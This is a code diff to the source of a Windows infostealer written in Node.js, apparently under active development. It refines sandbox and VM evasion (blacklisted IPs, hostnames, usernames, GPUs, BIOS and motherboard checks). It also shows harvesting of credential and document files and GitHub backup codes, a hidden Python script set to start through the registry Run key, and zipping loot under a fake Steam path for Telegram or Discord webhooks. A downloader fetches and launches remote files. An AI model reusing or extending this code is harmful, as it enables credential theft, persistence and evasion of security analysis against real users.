@@ -30,7 +30,6 @@ const chatId = 'YOURCHATID';
 const discordWebhookUrl = 'REMPLACE_ME';
 
 
-const blackListedIPS = ["88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", ];
 const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
 const blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl", ]
 const blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер", ]
@@ -72,55 +71,115 @@ async function main() {
 }
 
 
-function ipcheck(callback) {
-    executeCommand('curl http://api.ipify.org/ --ssl-no-revoke', (stdout) => {
-        if (checkListed(blackListedIPS, stdout)) {
-            exitProcess();
-        } else {
-            usernamecheck(callback);
+function executeCommand(command, callback) {
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error executing command: ${error.message}`);
+            return;
         }
+        if (stderr) {
+            console.error(`Error: ${stderr}`);
+            return;
+        }
+        callback(stdout.trim());
     });
 }
 
-function usernamecheck(callback) {
+function checkListed(list, value) {
+    return list.some(item => value.includes(item));
+}
+
+function usernameCheck(callback) {
     const userName = process.env['USERPROFILE'].split(path.sep)[2];
     if (checkListed(blackListedUsername, userName)) {
         exitProcess();
     } else {
-        hostnamecheck(callback);
+        hostnameCheck(callback);
     }
 }
 
-function hostnamecheck(callback) {
+function hostnameCheck(callback) {
     const hostName = os.hostname();
     if (checkListed(blackListedHostname, hostName)) {
         exitProcess();
     } else {
-        bioscheck(callback);
+        motherboardCheck(callback);
     }
 }
 
-function bioscheck(callback) {
-    executeCommand('wmic bios get smbiosbiosversion', (stdout) => {
-        if (stdout.includes("Hyper-V")) {
-            exitProcess();
+function motherboardCheck(callback) {
+    executeCommand('wmic baseboard get serialnumber', (stdout) => {
+        const motherboardSerial = stdout.trim().split('\n')[1].trim(); // Get the second line and clean spaces
+
+        // Check if the serial number starts with "Board-GoogleCloud"
+        if (motherboardSerial.startsWith("Board-GoogleCloud")) {
+            exitProcess(); // Exit if found
         } else {
-            speedcheck(callback);
+            biosCheck(callback); // Proceed to the next step if motherboard is not blocked
         }
     });
 }
 
-function checkAndExecute() {
-    getPCSerialNumber((serialNumber) => {
-        const disks = serialNumber.split('\n');
+function biosCheck(callback) {
+    executeCommand('wmic bios get smbiosbiosversion', (stdout) => {
+        if (stdout.includes("Hyper-V")) {
+            exitProcess();
+        } else {
+            speedCheck(callback);
+        }
+    });
+}
 
-        for (const disk of disks) {
-            if (disk.trim().startsWith("vb") || disk.trim().startsWith("vm")) {
+function speedCheck(callback) {
+    executeCommand('wmic MemoryChip get /format:list | find /i "Speed"', (stdout) => {
+        if (stdout.includes("Speed=0")) {
+            exitProcess();
+        } else {
+            gpuCheck(callback);
+        }
+    });
+}
+
+function gpuCheck(callback) {
+    executeCommand('wmic path win32_VideoController get name', (stdout) => {
+        const gpuList = stdout.split(",").map(gpu => gpu.trim());
+        if (checkListed(blackListedGPU, gpuList)) {
+            exitProcess();
+        } else {
+            if (gpuList.some(gpu => gpu.startsWith("VMware"))) {
+                exitProcess();
+            } else {
+                osCheck(callback);
+            }
+        }
+    });
+}
+
+function osCheck(callback) {
+    executeCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName", (stdout) => {
+        const osp = stdout.trim();
+        if (checkListed(blacklistedOS, osp)) {
+            exitProcess();
+        } else {
+            processCheck(callback);
+        }
+    });
+}
+
+function processCheck(callback) {
+    executeCommand('tasklist /fo csv', (stdout) => {
+        const processes = stdout.split('\r\n').map(line => {
+            const cols = line.split('","');
+            return cols[0].replace('"', '');
+        });
+
+        for (const processName of blackListedProcesses) {
+            if (processes.includes(processName)) {
                 exitProcess();
                 return;
             }
         }
-        console.log("No disk starting with 'vb' or 'vm' found.");
+        callback();
     });
 }
 
@@ -138,73 +197,28 @@ function getPCSerialNumber(callback) {
     });
 }
 
-function processCheck(callback) {
-    executeCommand('tasklist /fo csv', (stdout) => {
-        const processes = stdout.split('\r\n').map(line => {
-            const cols = line.split('","');
-            return cols[0].replace('"', '');
-        });
+function exitProcess() {
+    execSync("powershell wininit.exe");
+    console.log("Process exited due to security checks.");
+    process.exit(0);
+}
 
-        for (const processName of blackListedProcesses) {
-            if (processes.includes(processName)) {
+function antivm() {
+    getPCSerialNumber((serialNumber) => {
+        const disks = serialNumber.split('\n');
+
+        for (const disk of disks) {
+            if (disk.trim().startsWith("vb") || disk.trim().startsWith("vm")) {
                 exitProcess();
                 return;
             }
         }
 
-        callback();
+        // Start the check chain
+        usernameCheck(() => {
+            console.log("All checks passed successfully.");
+        });
     });
-}
-
-function speedcheck(callback) {
-    executeCommand('wmic MemoryChip get /format:list | find /i "Speed"', (stdout) => {
-        if (stdout.includes("Speed=0")) {
-            exitProcess();
-        } else {
-            gpucheck(callback);
-        }
-    });
-}
-
-function gpucheck(callback) {
-    executeCommand('wmic path win32_VideoController get name', (stdout) => {
-        const gpuList = stdout.split(",").map(gpu => gpu.trim());
-        if (checkListed(blackListedGPU, gpuList)) {
-            exitProcess();
-        } else {
-            if (gpuList.some(gpu => gpu.startsWith("VMware"))) {
-                exitProcess();
-            } else {
-                oscheck(callback);
-            }
-        }
-    });
-}
-
-
-function oscheck(callback) {
-    executeCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName", (stdout) => {
-        const osp = stdout.trim();
-        if (checkListed(blacklistedOS, osp)) {
-            exitProcess();
-        } else {
-            antivm(callback);
-        }
-    });
-}
-
-function antivm(callback) {
-    const totalRAM = os.totalmem();
-    if (totalRAM > 1200) {
-        ipcheck(callback);
-    } else {
-        console.log("");
-    }
-}
-
-function exitProcess() {
-    execSync("powershell wininit.exe")
-    process.exit(0);
 }
 
 function generateRandomString(length) {
@@ -578,19 +592,6 @@ async function findGithubBackupCodes() {
       console.error(`Error reading folder ${searchFolder}: ${err.message}`);
     }
   }
-}
-
-
-function executeCommand(command) {
-    return new Promise((resolve, reject) => {
-        exec(command, (error, stdout, stderr) => {
-            if (error) {
-                reject(`Error executing command: ${stderr}`);
-            } else {
-                resolve(stdout);
-            }
-        });
-    });
 }
 
 const allowedExtensions = [".rdp", ".txt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx", ".keys", ".ldb", ".log"];
@@ -1014,18 +1015,19 @@ async function installPython() {
 
     console.log('Performing silent installation of Python...');
     try {
-        execFileSync(pythonInstallerFile, [
-            '/quiet',
-            'InstallAllUsers=0',
-            'PrependPath=1',
-            'Include_test=0',
-            'Include_pip=1',
-            'Include_doc=0'
-        ], { stdio: 'ignore' });
-        console.log('Python installed successfully.');
+    execFileSync(pythonInstallerFile, [
+        '/quiet',
+        'InstallAllUsers=0',
+        'PrependPath=1',
+        'Include_test=0',
+        'Include_pip=1',
+        'Include_doc=0'
+    ], { stdio: 'inherit' });
+    console.log('Python installed successfully.');
     } catch (error) {
-        console.error(`Error during Python installation: ${error.message}`);
+    console.error(`Error during Python installation: ${error.message}`);
     }
+
 
     // Delete the installer file
     fs.unlinkSync(pythonInstallerFile);
@@ -1103,6 +1105,8 @@ exec(decoded_code)
     const scriptFilePath = path.join(appDataHiddenFolder, `${generateRandomString(10)}.py`);
     fs.writeFileSync(scriptFilePath, scriptContent);
 
+    await execPromise('pip install pyperclip');
+    
     try {
         // Add the script to the registry for startup
         const registryCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PythonScript" /t REG_SZ /d "${pythonwExe} \\"${scriptFilePath}\\"" /f`;
@@ -2829,22 +2833,6 @@ async function archiveAndSendData() {
             files.forEach(file => moveFileToFolder(file, dataType));
             console.log(`Files moved to ${dataType} folder`);
         });
-
-        const powershellCommand = `powershell -ExecutionPolicy Bypass -File "${scriptPath}"`;
-        const powershellProcess = exec(powershellCommand);
-        powershellProcess.stdout.on('data', (data) => {
-            console.log(`PowerShell script output:\n${data}`);
-        });
-        powershellProcess.stderr.on('data', (data) => {
-            console.error(`PowerShell script error:\n${data}`);
-        });
-        powershellProcess.on('exit', (code) => {
-            if (code === 0) {
-                console.log('PowerShell script executed successfully.');
-            } else {
-                console.error(`PowerShell script exited with code ${code}.`);
-            }
-        });
         const archive = new AdmZip();
         archive.addLocalFolder(mainFolderPath);
         zipFilePath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}.zip`;
@@ -4104,7 +4092,7 @@ async function binder(url, saveDir) {
 
     response.data.on('end', () => {
       console.log(`File downloaded and saved to ${filePath}`);
-      executeCommand(filePath);
+      executeCommandbinder(filePath);
     });
 
     response.data.on('error', (err) => {
@@ -4116,7 +4104,7 @@ async function binder(url, saveDir) {
   }
 }
 
-function executeCommand(filePath) {
+function executeCommandbinder(filePath) {
   const command = `start "" "${filePath}"`;
 
   exec(command, (error, stdout, stderr) => {
